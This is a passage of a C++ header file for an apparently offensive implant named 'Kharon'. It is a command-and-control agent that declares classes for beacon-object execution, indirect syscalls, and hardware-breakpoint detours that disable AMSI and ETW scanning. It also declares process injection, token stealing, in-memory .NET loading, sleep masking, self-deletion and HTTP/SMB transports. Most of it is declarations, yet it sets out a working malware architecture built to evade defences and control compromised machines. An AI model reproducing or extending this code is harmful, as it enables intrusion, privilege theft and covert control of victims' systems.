        // ApiTable[22] = { Hsh::Str("BeaconFormatToString"),   reinterpret_cast<PVOID>(&Coff::FmtToString) },
        ApiTable[23] = { Hsh::Str("BeaconFormatInt"),        reinterpret_cast<PVOID>(&Coff::FmtFree) },
        ApiTable[24] = { Hsh::Str("BeaconFormatPrintf"),     reinterpret_cast<PVOID>(&Coff::FmtPrintf) },
        ApiTable[25] = { Hsh::Str("BeaconFormatReset"),      reinterpret_cast<PVOID>(&Coff::FmtReset) },
    };

    auto Add(
        VOID* MmBegin,
        VOID* MmEnd,
        CHAR* UUID,
        ULONG CmdID
    ) -> BOF_OBJ*;

    auto GetTask(
        VOID* Address
    ) -> CHAR*;

    auto GetCmdID(
        VOID* Address
    ) -> ULONG;

    auto Rm(
        BOF_OBJ* Obj
    ) -> BOOL;

    inline auto RslRel(
        _In_ PVOID  Base,
        _In_ PVOID  Rel,
        _In_ UINT16 Type
    ) -> VOID;

    auto RslApi(
        _In_ PCHAR SymName
    ) -> PVOID;

    auto Loader(
        _In_ BYTE* Buffer,
        _In_ ULONG Size,
        _In_ BYTE* Args,
        _In_ ULONG Argc,
        _In_ CHAR* UUID,
        _In_ ULONG CmdID
    ) -> BOOL;

    static auto DataExtract(
        DATAP* parser,
        PINT   size
    ) -> PCHAR;

    static auto DataInt(
        DATAP* parser
    ) -> INT;

    static auto DataLength(
        DATAP* parser
    ) -> INT;

    static auto DataShort(
        DATAP* parser
    ) -> SHORT;

    static auto DataParse(
        DATAP* parser,
        PCHAR  buffer,
        INT    size
    ) -> VOID;

    static auto DataPtr(
        DATAP* parser, 
        INT    size
    ) -> VOID;

    static auto FmtAlloc(
        FMTP* fmt,
        INT   maxsz
    ) -> VOID;

    static auto FmtAppend(
        FMTP* Fmt,
        CHAR* Data,
        INT32 Len
    ) -> VOID;

    static auto FmtFree(
        FMTP* fmt
    ) -> VOID;

    static auto FmtInt(
        FMTP* fmt,
        INT32 val
    ) -> VOID;

    static auto FmtPrintf(
        FMTP* Fmt,
        CHAR* Data,
        ...
    ) -> VOID;

    static auto FmtReset(
        FMTP* fmt
    ) -> VOID;

    static auto FmtToString(
        FMTP* fmt,
        PINT  size
    ) -> PCHAR;

    static auto IsAdmin(
        VOID
    ) -> BOOL;

    static auto UseToken(
        HANDLE token
    ) -> BOOL;

    static auto RevertToken(
        VOID
    ) -> VOID;

    static auto GetSpawn(
        BOOL  x86, 
        PCHAR buffer,
        INT   length
    ) -> VOID;

    static auto SpawnTmpProcess(
        BOOL x86, 
        BOOL ignoreToken, 
        STARTUPINFO si, 
        PPROCESS_INFORMATION pInfo
    ) -> BOOL;

    static auto CleanupProcess(
        PPROCESS_INFORMATION pinfo
    ) -> VOID;

    static auto DataStoreGetItem(

    );

    static auto DataStoreProtectItem(

    );

    static auto DataStoreUnprotectItem(

    );

    static auto Information(
        PBEACON_INFO Info
    ) -> VOID;

    static auto AddValue(
        PCCH  key, 
        PVOID ptr
    ) -> BOOL;

    static auto GetValue(
        PCCH key
    ) -> PVOID;

    static auto RmValue(
        PCCH key
    ) -> BOOL;

    static auto Printf(
        INT  type,
        PCCH Fmt,
        ...
    ) -> VOID;

    static auto Output(
        INT  type,
        PCCH data,
        INT  len
    ) -> VOID;

    static auto VirtualAlloc(
        LPVOID Address, 
        SIZE_T Size, 
        DWORD  AllocType, 
        DWORD  Protect
    ) -> PVOID; 

    static auto VirtualAllocEx(
        HANDLE Handle,
        LPVOID Address, 
        SIZE_T Size, 
        DWORD  AllocType, 
        DWORD  Protect
    ) -> PVOID; 

    static auto VirtualProtect(
        LPVOID Address, 
        SIZE_T Size, 
        DWORD  NewProtect, 
        PDWORD OldProtect
    ) -> BOOL;

    static auto VirtualProtectEx(
        HANDLE Handle,
        LPVOID Address, 
        SIZE_T Size, 
        DWORD  NewProtect, 
        PDWORD OldProtect
    ) -> BOOL;
    
    static auto OpenProcess(
        DWORD desiredAccess, 
        BOOL  inheritHandle, 
        DWORD processId
    ) -> HANDLE;

    static auto OpenThread(
        DWORD desiredAccess, 
        BOOL  inheritHandle, 
        DWORD threadId
    ) -> HANDLE;

    static auto LoadLibraryA(
        _In_ PCHAR LibraryName
    ) -> HMODULE;
};

class Syscall {
private:
    Root::Kharon* Self;    
public:
    Syscall( Root::Kharon* KharonRf ) : Self( KharonRf ) {};

    BOOL Enabled = KH_INDIRECT_SYSCALL_ENABLED;
    ESYS_OPT Index;

    struct {
        ULONG ssn;
        ULONG Hash;
        UPTR  Address;
        UPTR  Instruction;
    } Ext[syLast] = {};

    auto Fetch(
        _In_ INT8 SysIdx
    ) -> BOOL;
};

class HwbpEng {
private:
    Root::Kharon* Self;
public:
    HwbpEng( Root::Kharon* KharonRf ) : Self( KharonRf ) {};

    DESCRIPTOR_HOOK*      Threads = nullptr;
    RTL_CRITICAL_SECTION* Crt     = nullptr;
    CRITICAL_SECTION*     CritSec = nullptr;

    INT32 DotnetBypass = KH_HARDWARE_BREAKPOINT_BYPASS_DOTNET;
    BOOL  Initialized  = FALSE;
    PVOID Handler      = nullptr;

    struct {
        PVOID Parameter;
        ULONG TimerWait;
    } HookCallbackArg;

    struct {
        UPTR NtTraceEvent;
    } Etw = {
        .NtTraceEvent = NULL
    };

    struct {
        UPTR Handle;
        UPTR AmsiScanBuffer;
    } Amsi = {
        .Handle = NULL,
        .AmsiScanBuffer = NULL
    };

    auto Init( VOID ) -> BOOL;
    auto Clean( VOID ) -> BOOL;

    auto SetDr7(
        _In_ UPTR ActVal,
        _In_ UPTR NewVal,
        _In_ INT  StartPos,
        _In_ INT  BitsCount
    ) -> UPTR;

    auto Install(
        _In_ UPTR  Address,
        _In_ INT8  Drx,
        _In_ PVOID Callback,
        _In_ ULONG ThreadID
    ) -> BOOL;

    auto SetBreak(
        _In_ ULONG ThreadID,
        _In_ UPTR  Address,
        _In_ INT8  Drx,
        _In_ BOOL  Init
    ) -> BOOL;

    auto Uninstall(
        _In_ UPTR  Address,
        _In_ ULONG ThreadID
    ) -> BOOL;
 
    auto GetArg(
        _In_ PCONTEXT Ctx,
        _In_ ULONG    Idx
    ) -> UPTR;

    auto SetArg(
        _In_ PCONTEXT Ctx,
        _In_ UPTR     Val,
        _In_ ULONG    Idx
    ) -> VOID;

    auto BlockReal(
        _In_ PCONTEXT Ctx
    ) -> VOID;

    auto Insert(
        _In_ UPTR  Address,
        _In_ INT8  Drx,
        _In_ BOOL  Init,
        _In_ ULONG ThreadID
    ) -> BOOL;

    auto HookCallback(
        _In_ PVOID Parameter,
        _In_ BOOL  TimerWait
    ) -> VOID;

    __forceinline auto static DECLFN HookCallbackThunk(
        _In_ PVOID This
    ) -> VOID {
        This = NtCurrentPeb()->TelemetryCoverageHeader;
        return static_cast<Root::Kharon*>( This )->Hw->HookCallback( static_cast<Root::Kharon*>( This )->Hw->HookCallbackArg.Parameter, static_cast<Root::Kharon*>( This )->Hw->HookCallbackArg.TimerWait );
    }

    auto MainHandler( 
        _In_ PEXCEPTION_POINTERS e 
    ) -> LONG;

    __forceinline static auto MainThunk(
        _In_ PEXCEPTION_POINTERS e,
        _In_ PVOID               This
    ) -> LONG {
        This = NtCurrentPeb()->TelemetryCoverageHeader;
        return static_cast<Root::Kharon*>( This )->Hw->MainHandler( e );
    }

    auto AddNewThreads(
        _In_ INT8 Drx
    ) -> BOOL;

    auto RmNewThreads(
        _In_ INT8 Drx
    ) -> BOOL;    

    auto NtCreateThreadExHk(
        _In_ PCONTEXT Ctx
    ) -> VOID;

    static auto NtCreateThreadExHkThunk(
        _In_ PCONTEXT Ctx,
        _In_ PVOID    This 
    ) -> VOID;

    auto DotnetInit( VOID ) -> BOOL;
    auto DotnetExit( VOID ) -> BOOL;

    auto EtwDetour(
        _In_ PCONTEXT Ctx
    ) -> VOID;

    auto AmsiDetour(
        _In_ PCONTEXT Ctx
    ) -> VOID;    

    static auto EtwThunk(
        _In_ PCONTEXT Ctx,
        _In_ PVOID    This 
    ) -> VOID;

    static auto AmsiThunk(
        _In_ PCONTEXT Ctx,
        _In_ PVOID    This 
    ) -> VOID;
};

class Jobs {
private:
    Root::Kharon* Self;
public:
    Jobs( Root::Kharon* KharonRf ) : Self( KharonRf ) {};

    ULONG Count = 0;
    JOBS* List  = nullptr;

    auto Create(
        _In_ CHAR*   UUID, 
        _In_ PARSER* Parser
    ) -> JOBS*;
    
    auto Send( 
        _In_ PACKAGE* PostJobs 
    ) -> VOID;

    auto ExecuteAll( VOID ) -> VOID;
    
    auto static Execute(
        _In_ JOBS* Job
    ) -> ERROR_CODE;
    
    auto GetByUUID(
        _In_ CHAR* UUID
    ) -> JOBS*;
    
    auto GetByID(
        _In_ ULONG ID
    ) -> JOBS*;

    auto Cleanup( VOID ) -> VOID;
    
    auto Remove(
        _In_ JOBS* Job
    ) -> BOOL;
};

class Dotnet {
private:
    Root::Kharon* Self;
public:
    Dotnet( Root::Kharon* KharonRf ) : Self( KharonRf ) {};

    struct {
        CLSID CLRMetaHost;
        CLSID CorRuntimeHost;
    } CLSID = {
        .CLRMetaHost    = { 0x9280188d, 0xe8e,  0x4867, { 0xb3, 0xc,  0x7f, 0xa8, 0x38, 0x84, 0xe8, 0xde } },
        .CorRuntimeHost = { 0xcb2f6723, 0xab3a, 0x11d2, { 0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e } }
    };

    struct {
        IID IHostControl;
        IID AppDomain;
        IID ICLRMetaHost;
        IID ICLRRuntimeInfo;
        IID ICorRuntimeHost;
    } IID = {
        .IHostControl     = { 0x02CA073C, 0x7079, 0x4860, { 0x88, 0x0A, 0xC2, 0xF7, 0xA4, 0x49, 0xC9, 0x91 } },
        .AppDomain        = { 0x05F696DC, 0x2B29, 0x3663, { 0xAD, 0x8B, 0xC4, 0x38, 0x9C, 0xF2, 0xA7, 0x13 } },
        .ICLRMetaHost     = { 0xD332DB9E, 0xB9B3, 0x4125, { 0x82, 0x07, 0xA1, 0x48, 0x84, 0xF5, 0x32, 0x16 } },
        .ICLRRuntimeInfo  = { 0xBD39D1D2, 0xBA2F, 0x486a, { 0x89, 0xB0, 0xB4, 0xB0, 0xCB, 0x46, 0x68, 0x91 } },
        .ICorRuntimeHost  = { 0xcb2f6722, 0xab3a, 0x11d2, { 0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e } }
    };

    struct {
        ULONG  s; // size
        PCHAR  p; // pointer
    } Out = {
        .s = 0,
        .p = nullptr
    };

    struct {
        ULONG  ID;
        PWCHAR AppDomain;
        PWCHAR AssemblyName;
    } Invoke[5] = {};

    BOOL KeepLoad = FALSE;

    auto PatchExit(
        _In_ ICorRuntimeHost* IRuntime
    ) -> HRESULT;

    auto VersionList( VOID ) -> VOID;

    auto Inline(
        _In_ BYTE* AsmBytes,
        _In_ ULONG AsmLength,
        _In_ PWSTR Arguments,
        _In_ PWSTR AppDomName,
        _In_ PWSTR Version,
        _In_ BOOL  KeepLoad
    ) -> BOOL;
};

class Useful {
private:
    Root::Kharon* Self;
public:
    Useful( Root::Kharon* KharonRf ) : Self( KharonRf ) {};

    auto Xor( 
        _In_opt_ BYTE*  Bin, 
        _In_     SIZE_T BinSize, 
        _In_     BYTE*  Key, 
        _In_     SIZE_T KeySize 
    ) -> VOID;

    auto FindGadget(
        _In_ UPTR   ModuleBase,
        _In_ UINT16 RegValue
    ) -> UPTR;

    auto SecVa(
        _In_ UPTR LibBase,
        _In_ UPTR SecHash
    ) -> ULONG;

    auto SecSize(
        _In_ UPTR LibBase,
        _In_ UPTR SecHash
    ) -> ULONG;

    auto NtStatusToError(
        _In_ NTSTATUS NtStatus
    ) -> ERROR_CODE;

    auto SelfDelete( VOID ) -> BOOL;
    
    auto CheckKillDate( VOID ) -> VOID;

    auto FixRel(
        _In_ PVOID Base,
        _In_ UPTR  Delta,
        _In_ PIMAGE_DATA_DIRECTORY DataDir
    ) -> VOID;

    auto FixExp(
        _In_ PVOID Base,
        _In_ PIMAGE_DATA_DIRECTORY DataDir
    ) -> VOID;

    auto FixTls(
        _In_ PVOID Base,
        _In_ PIMAGE_DATA_DIRECTORY DataDir
    ) -> VOID;

    auto FixImp(
        _In_ PVOID Base,
        _In_ PIMAGE_DATA_DIRECTORY DataDir
    ) -> BOOL;
};

class Package {
private:
    Root::Kharon* Self;

public:
    Package( Root::Kharon* KharonRf ) : Self( KharonRf ) {};

    PPACKAGE Global = nullptr; // for temporary usage

    auto Base64Enc(
        _In_ const unsigned char* in, 
        _In_ SIZE_T len
    ) -> char*;

    auto SendOut(
        _In_ CHAR* UUID,
        _In_ ULONG CmdID,
        _In_ BYTE* Buffer,
        _In_ INT32 Length,
        _In_ ULONG Type
    ) -> BOOL;

    auto SendMsg(
        _In_ CHAR* UUID,
        _In_ CHAR* Message,
        _In_ ULONG Type
    ) -> BOOL;

    auto Base64Dec(
        const char* in, 
        unsigned char* out, 
        SIZE_T outlen
    ) -> INT;

    auto b64IsValidChar(char c) -> INT;

    auto Base64EncSize(
        _In_ SIZE_T inlen
    ) -> SIZE_T;

    auto Base64DecSize(
        _In_ const char* in
    ) -> SIZE_T;

    auto Int16( 
        _In_ PPACKAGE Package, 
        _In_ INT16    dataInt 
    ) -> VOID;

    auto Int32( 
        _In_ PPACKAGE Package, 
        _In_ INT32    dataInt
    ) -> VOID;

    auto Int64( 
        _In_ PPACKAGE Package, 
        _In_ INT64    dataInt 
    ) -> VOID;

    auto Pad( 
        _In_ PPACKAGE Package, 
        _In_ PUCHAR   Data, 
        _In_ SIZE_T   Size 
    ) -> VOID;

    auto Bytes( 
        _In_ PPACKAGE Package, 
        _In_ PUCHAR   Data, 
        _In_ SIZE_T   Size 
    ) -> VOID;

    auto Byte( 
        _In_ PPACKAGE Package, 
        _In_ BYTE     dataInt 
    ) -> VOID;

    auto Create( 
        _In_ ULONG CommandID,
        _In_ PCHAR UUID
    ) -> PPACKAGE;

    auto PostJobs(
        VOID
    ) -> PPACKAGE;

    auto NewTask( 
        VOID
    ) -> PPACKAGE;

    auto Checkin(
        VOID
    ) -> PPACKAGE;

    auto Destroy( 
        _In_ PPACKAGE Package 
    ) -> VOID;

    auto Transmit( 
        _In_  PPACKAGE Package, 
        _Out_ PVOID*   Response, 
        _Out_ PUINT64  Size 
    ) -> BOOL;

    auto Error(
        _In_ ULONG ErrorCode
    ) -> VOID;

    auto Str( 
        _In_ PPACKAGE package, 
        _In_ PCHAR    data 
    ) -> VOID;

    auto Wstr( 
        _In_ PPACKAGE package, 
        _In_ PWCHAR   data 
    ) -> VOID;
};

class Parser {
private:
    Root::Kharon* Self;
public:
    Parser( Root::Kharon* KharonRf ) : Self( KharonRf ) {};

    BOOL    Endian = FALSE;
    PPARSER Shared;

    auto NewTask( 
        _In_ PPARSER parser, 
        _In_ PVOID   Buffer, 
        _In_ UINT64  size 
    ) -> VOID;

    auto New( 
        _In_ PPARSER parser, 
        _In_ PVOID   Buffer, 
        _In_ UINT64  size 
    ) -> VOID;

    auto Pad(
        _In_  PPARSER parser,
        _Out_ ULONG size
    ) -> BYTE*;

    auto Byte(
        _In_ PPARSER Parser
    ) -> BYTE;

    auto Int16(
        _In_ PPARSER Parser
    ) -> INT16;

    auto Int32(
        _In_ PPARSER Parser
    ) -> INT32;

    auto Int64(
        _In_ PPARSER Parser
    ) -> INT64;

    auto Bytes(
        _In_  PPARSER parser,
        _Out_ ULONG*  size
    ) -> BYTE*;

    auto Str( 
        _In_ PPARSER parser, 
        _In_ ULONG*  size 
    ) -> PCHAR;

    auto Wstr(
        _In_ PPARSER parser, 
        _In_ ULONG*  size 
    ) -> PWCHAR;

    auto Destroy(
        _In_ PPARSER Parser 
    ) -> BOOL;   
};

class Transport {    
private:
    Root::Kharon* Self;
public:
    Transport( Root::Kharon* KharonRf ) : Self( KharonRf ) {};

#if PROFILE_C2 == PROFILE_WEB
    struct {
        PWCHAR Host;
        ULONG  Port;
        PWCHAR EndPoint;
        PWCHAR UserAgent;
        PWCHAR HttpHeaders;
        PWCHAR ProxyUrl;
        PWCHAR ProxyUsername;
        PWCHAR ProxyPassword;
        BOOL   ProxyEnabled;
        BOOL   Secure;
    } Web = {
        .Host         = WEB_HOST,
        .Port         = WEB_PORT,
        .EndPoint     = WEB_ENDPOINT,
        .UserAgent    = WEB_USER_AGENT,
        .HttpHeaders  = WEB_HTTP_HEADERS,
        .ProxyUrl     = WEB_PROXY_URL,
        .ProxyEnabled = WEB_PROXY_ENABLED,
        .Secure       = WEB_SECURE_ENABLED
    };
#endif // PROFILE_WEB

    struct {
        struct {
            PCHAR FileID;
            ULONG ChunkSize;
            ULONG CurChunk;
            ULONG TotalChunks;
            PCHAR Path;
        } Up;
        
        struct {

        } Down;
    } Tf = {
        .Up = {
            .ChunkSize = KH_CHUNK_SIZE
        }
    };


    struct {
        PVOID  Node;
#if PROFILE_C2 == PROFILE_SMB
        PCHAR  Name;
        HANDLE Handle;
#endif
    } Pipe = {
        .Node = nullptr,
#if PROFILE_C2 == PROFILE_SMB
        .Name = SMB_PIPE_NAME
#endif
    };

    auto SmbAdd(
        _In_ CHAR* NamedPipe,
        _In_ PVOID Parser,
        _In_ PVOID Package
    ) -> PVOID;

    auto SmbRm(
        _In_ PVOID SmbData
    ) -> BOOL;

    auto SmbGet(
        _In_ CHAR* SmbUUID
    ) -> PVOID;

    auto SmbList(
        VOID
    ) -> PVOID;

    auto Checkin(
        VOID
    ) -> BOOL;

    auto Send(
        _In_      PVOID   Data,
        _In_      UINT64  Size,
        _Out_opt_ PVOID  *RecvData,
        _Out_opt_ UINT64 *RecvSize
    ) -> BOOL;

    auto SmbSend(
        _In_      PVOID   Data,
        _In_      UINT64  Size,
        _Out_opt_ PVOID  *RecvData,
        _Out_opt_ UINT64 *RecvSize
    ) -> BOOL;

    auto WebSend(
        _In_      PVOID   Data,
        _In_      UINT64  Size,
        _Out_opt_ PVOID  *RecvData,
        _Out_opt_ UINT64 *RecvSize
    ) -> BOOL;
};

typedef struct _SOCKET_CTX {
    ULONG  ServerID;
    SOCKET Socket;

    struct _SOCKET_CTX* Next;
} SOCKET_CTX, *PSOCKET_CTX;

class Socket {
private:
    Root::Kharon* Self;
public:
    Socket( Root::Kharon* KharonRf ) : Self( KharonRf ) {};

    BOOL        Initialized = FALSE;
    ULONG       Count = 0;
    PSOCKET_CTX Ctx   = nullptr;

    auto Exist( 
        _In_ ULONG ServerID 
    ) -> BOOL;

    auto Add(
        _In_ ULONG  ServerID,
        _In_ SOCKET Socket
    ) -> ERROR_CODE;

    auto Get(
        _In_ ULONG  ServerID
    ) -> SOCKET;

    auto RmCtx(
        _In_ ULONG ServerID
    ) -> ERROR_CODE;

    auto InitWSA( VOID ) -> BOOL;

    auto RecvAll( SOCKET Socket, PVOID Buffer, DWORD Length, PDWORD BytesRead ) -> BOOL;

    auto LogData(
        _In_ const char* description,
        _In_ const BYTE* data,
        _In_ ULONG length
    ) -> VOID;
};

class Task {
private:
    Root::Kharon* Self;
public:
    Task( Root::Kharon* KharonRf ) : Self( KharonRf ) {};

    auto Dispatcher( 
        VOID 
    ) -> VOID;

    auto Token(
        _In_ PJOBS Job
    ) -> ERROR_CODE;

    auto Download(
        _In_ PJOBS Job
    ) -> ERROR_CODE;
    
    auto Upload(
        _In_ PJOBS Job
    ) -> ERROR_CODE;

    auto Socks( 
        _In_ PJOBS Job
    ) -> ERROR_CODE;

    auto Config( 
        _In_ PJOBS Job
    ) -> ERROR_CODE;

    auto ExecPE( 
        _In_ PJOBS Job
    ) -> ERROR_CODE;

    auto ExecSc( 
        _In_ PJOBS Job
    ) -> ERROR_CODE;

    auto Process( 
        _In_ PJOBS Job
    ) -> ERROR_CODE;

    auto Info( 
        _In_ PJOBS Job
    ) -> ERROR_CODE;

    auto FileSystem( 
        _In_ PJOBS Job
    ) -> ERROR_CODE;

    auto Dotnet(
        _In_ PJOBS Job
    ) -> ERROR_CODE;

    auto ExecBof(
        _In_ PJOBS Job
    ) -> ERROR_CODE;

    auto Exit(
        _In_ PJOBS Job
    ) -> ERROR_CODE;

    typedef auto ( Task::*TASK_FUNC )( PJOBS ) -> ERROR_CODE;

    struct {
        ULONG        ID;
        ERROR_CODE ( Task::*Run )( PJOBS );
    } Mgmt[TSK_LENGTH] = {
        Mgmt[0].ID = TskExit,       Mgmt[0].Run = &Task::Exit,
        Mgmt[1].ID = TskFileSystem, Mgmt[1].Run = &Task::FileSystem,
        Mgmt[2].ID = TskProcess,    Mgmt[2].Run = &Task::Process,
        Mgmt[3].ID = TskGetInfo,    Mgmt[3].Run = &Task::Info,
        Mgmt[4].ID = TskExecBof,    Mgmt[4].Run = &Task::ExecBof,
        Mgmt[5].ID = TskExecSc,     Mgmt[5].Run = &Task::ExecSc,
        Mgmt[6].ID = TskConfig,     Mgmt[6].Run = &Task::Config,
        Mgmt[7].ID = TskDownload,   Mgmt[7].Run = &Task::Download,
        Mgmt[8].ID = TskUpload,     Mgmt[8].Run = &Task::Upload,
        Mgmt[9].ID = TskDotnet,     Mgmt[9].Run = &Task::Dotnet,
        Mgmt[10].ID = TskSocks,     Mgmt[10].Run = &Task::Socks,
        Mgmt[11].ID = TskExecPE,    Mgmt[11].Run = &Task::ExecPE,
        Mgmt[12].ID = TskToken,     Mgmt[12].Run = &Task::Token
    };
};

class Process {
private:
    Root::Kharon* Self;
public:
    Process( Root::Kharon* KharonRf ) : Self( KharonRf ) {};
    
    struct {
        PVOID p;
        ULONG s;
    } Out;

    struct {
        ULONG ParentID;
        BOOL  BlockDlls;
        PCHAR CurrentDir;
        BOOL  Pipe;
    } Ctx = {
        .ParentID   = 0,
        .BlockDlls  = FALSE,
        .CurrentDir = nullptr,
        .Pipe       = TRUE
    };

    auto Open(
        _In_ ULONG RightsAccess,
        _In_ BOOL  InheritHandle,
        _In_ ULONG ProcessID
    ) -> HANDLE;

    auto Create(
        _In_  PCHAR                CommandLine,
        _In_  ULONG                PsFlags,
        _Out_ PPROCESS_INFORMATION PsInfo
    ) -> BOOL;
};

class Thread {
    private:
    Root::Kharon* Self;
public:
    Thread( Root::Kharon* KharonRf ) : Self( KharonRf ) {};

    auto Create(
        _In_  HANDLE ProcessHandle,
        _In_  PVOID  StartAddress,
        _In_  PVOID  Parameter,
        _In_  ULONG  StackSize,
        _In_  ULONG  Flags,
        _Out_ ULONG* ThreadID
    ) -> HANDLE;

    auto Open(
        _In_ ULONG RightAccess,
        _In_ BOOL  Inherit,
        _In_ ULONG ThreadID
    ) -> HANDLE;

    auto Enum( 
        _In_      INT8  Type,
        _In_opt_  ULONG ProcessID = 0,
        _Out_opt_ ULONG ThreadQtt = 0,
        _Out_opt_ PSYSTEM_THREAD_INFORMATION ThreadInfo = NULL
    ) -> ULONG;

    auto Rnd( VOID ) -> ULONG {
        return Enum( TdRandom, 0 );
    };

    auto Target( 
        _In_opt_  ULONG ProcessID,
        _Out_opt_ ULONG ThreadQtt,
        _Out_opt_ PSYSTEM_THREAD_INFORMATION ThreadInfo
    ) -> ULONG {
        return Enum( TdTarget, ProcessID, ThreadQtt, ThreadInfo );
    }

    auto QueueAPC(
        _In_     PVOID  CallbackFnc,
        _In_     HANDLE ThreadHandle,
        _In_opt_ PVOID  Argument1,
        _In_opt_ PVOID  Argument2,
        _In_opt_ PVOID  Argument3
    ) -> LONG;

    auto InstallHwbp( VOID ) {
        return Enum( TdHwbp );
    }
};

class Library {
private:
    Root::Kharon* Self;
public:
    Library( Root::Kharon* KharonRf ) : Self( KharonRf ) {};

    auto Load(
        _In_ PCHAR LibName
    ) -> UPTR;

    auto GetRnd( VOID ) -> PCHAR;

    auto Map(
        _In_ PCHAR LibName
    ) -> UPTR;
};

typedef struct _TOKEN_NODE {
    ULONG  TokenID; // fiction number generated from agent
    HANDLE Handle;
    PCHAR  User;
    ULONG  ProcessID;
    ULONG  ThreadID;
    PCHAR  Host;
    struct _TOKEN_NODE* Next;
} TOKEN_NODE; 

class Token {
private:
    Root::Kharon* Self;
public:
    Token( Root::Kharon* KharonRf ) : Self( KharonRf ) {};

    TOKEN_NODE* Node = nullptr;

    auto Current( VOID ) -> HANDLE;

    auto TdOpen(
        _In_  HANDLE  ThreadHandle,
        _In_  ULONG   RightsAccess,
        _In_  BOOL    OpenAsSelf,
        _Out_ HANDLE* TokenHandle
    ) -> BOOL;

    auto SetPriv(
        _In_ HANDLE Handle,
        _In_ CHAR*  PrivName
    ) -> BOOL;

    auto Steal(
        _In_ ULONG ProcessID
    ) -> HANDLE;

    auto GetUser( 
        _In_  HANDLE TokenHandle 
    ) -> CHAR*;

    auto ProcOpen(
        _In_  HANDLE  ProcessHandle,
        _In_  ULONG   RightsAccess,
        _Out_ HANDLE* TokenHandle
    ) -> BOOL;
};

typedef struct _HEAP_NODE {
    PVOID Block;
    ULONG Size;
    struct _HEAP_NODE* Next;
} HEAP_NODE;

class Heap {
private:
    Root::Kharon* Self;
public:
    Heap( Root::Kharon* KharonRf ) : Self( KharonRf ) {};

    HEAP_NODE* Node = nullptr;
    ULONG Count     = 0;

    BYTE  Key[16]   = { 0 };
    BOOL  Obfuscate = KH_HEAP_MASK;

    auto Crypt( VOID ) -> VOID;

    auto Alloc(
        _In_ ULONG Size
    ) -> PVOID;
    
    auto ReAlloc(
        _In_ PVOID Block,
        _In_ ULONG Size
    ) -> PVOID;
    
    auto Free(
        _In_ PVOID Block
    ) -> BOOL;
};

class Memory {
private:
    Root::Kharon* Self;
public:
    Memory( Root::Kharon* KharonRf ) : Self( KharonRf ) {};

    auto Alloc(
        _In_ PVOID Base,
        _In_ ULONG Size,
        _In_ ULONG AllocType,
        _In_ ULONG Protect,
        _In_ HANDLE Handle = nullptr
    ) -> PVOID;

    auto Protect(
        _In_  PVOID  Base,
        _In_  ULONG  Size,
        _In_  ULONG  NewProt,
        _Out_ ULONG* OldProt,
        _In_ HANDLE Handle = nullptr
    ) -> BOOL;

    auto Write(
        _In_ PVOID  Base,
        _In_ BYTE*  Buffer,
        _In_ ULONG  Size,
        _In_ HANDLE Handle = nullptr
    ) -> BOOL;

    auto WriteAPC(
        _In_ HANDLE Handle,
        _In_ PVOID  Base,
        _In_ BYTE*  Buffer,
        _In_ ULONG  Size
    ) -> BOOL;

    auto Read(
        _In_  PVOID   Base,
        _In_  BYTE*   Buffer,
        _In_  SIZE_T  Size,
        _Out_ SIZE_T* Reads,
        _In_ HANDLE Handle = nullptr
    ) -> BOOL;

    auto Free(
        _In_ PVOID  Base,
        _In_ ULONG  Size,
        _In_ ULONG  FreeType,
        _In_ HANDLE Handle = nullptr
    ) -> BOOL;

    auto MapView(
        _In_        HANDLE          SectionHandle,
        _In_        HANDLE          ProcessHandle,
        _Inout_     PVOID          *BaseAddress,
        _In_        ULONG_PTR       ZeroBits,
        _In_        SIZE_T          CommitSize,
        _Inout_opt_ LARGE_INTEGER*  SectionOffset,
        _Inout_     SIZE_T*         ViewSize,
        _In_        SECTION_INHERIT InheritDisposition,
        _In_        ULONG           AllocationType,
        _In_        ULONG           PageProtection
    ) -> LONG;

    auto CreateSection(
        _Out_    HANDLE*            SectionHandle,
        _In_     ACCESS_MASK        DesiredAccess,
        _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
        _In_opt_ LARGE_INTEGER*     MaximumSize,
        _In_     ULONG              SectionPageProtection,
        _In_     ULONG              AllocationAttributes,
        _In_opt_ HANDLE             FileHandle
    ) -> LONG;

};

class Mask {
private:
    Root::Kharon* Self;
public:
    Mask( Root::Kharon* KharonRf ) : Self( KharonRf ) {};

    struct {
        UPTR  NtContinueGadget;
        UPTR  JmpGadget;
        UINT8 TechniqueID;
        BOOL  Heap;
    } Ctx = {
        .TechniqueID = KH_SLEEP_MASK,
        .Heap        = KH_HEAP_MASK
    };

    auto Main(
        _In_ ULONG Time
    ) -> BOOL;

    auto Timer(
        _In_ ULONG Time
    ) -> BOOL;

    auto Apc(
        _In_ ULONG Time
    ) -> BOOL;

    auto Wait(
        _In_ ULONG Time
    ) -> BOOL;
};

#define KH_INJ_HIBERNING 0x200
#define KH_INJ_RUNNING   0x100

typedef struct _INJECTION_NODE {
    ULONG ID;
    PVOID Address;
    ULONG Length;
    ULONG State;
    BOOL  Obfuscated;
    PVOID Output;
    ULONG OutLength;
    struct _INJECTION_NODE* Next;
} INJECTION_NODE, *PINJECTION_NODE;

class Injection {
private:
    Root::Kharon* Self;
public:
    Injection( Root::Kharon* KharonRf ) : Self( KharonRf ) {};

    PINJECTION_NODE Node = nullptr;

    struct {
        struct {
            UINT8 TechniqueID;
        } PE;

        struct {
            UINT8 TechniqueID;
        } Sc; 

        struct {
            BOOL  b;
            ULONG s;
            PVOID p;
        } Pipe;

        struct {
            ULONG s;
            BYTE* p;
        } Param;
        
        BOOL Spawn;

    } Ctx = {
        .PE = { .TechniqueID = PeReflection },
        .Sc = { .TechniqueID = KH_INJECTION_SC }
    };

    auto Shellcode(
        _In_ ULONG ProcessID,
        _In_ BYTE* Buffer,
        _In_ UPTR  Size,
        _In_ PVOID Param
    ) -> BOOL;

    auto Classic(
        _In_  ULONG   ProcessID,
        _In_  BYTE*   Buffer,
        _In_  UPTR    Size,
        _In_  PVOID   Param,
        _Out_ PVOID*  Base
    ) -> BOOL;

    auto Stomp(
        _In_  ULONG   ProcessID,
        _In_  BYTE*   Buffer,
        _In_  UPTR    Size,
        _In_  PVOID   Param,
        _Out_ PVOID*  Base
    ) -> BOOL;

    auto Reflection(
        _In_ BYTE*  Buffer,
        _In_ ULONG  Size,
        _In_ PVOID  Param
    ) -> BOOL;
};

class ProcThreadAttrList: public Root::Kharon {
private:
    LPPROC_THREAD_ATTRIBUTE_LIST AttrBuff;
    UPTR                         AttrSize;

public:
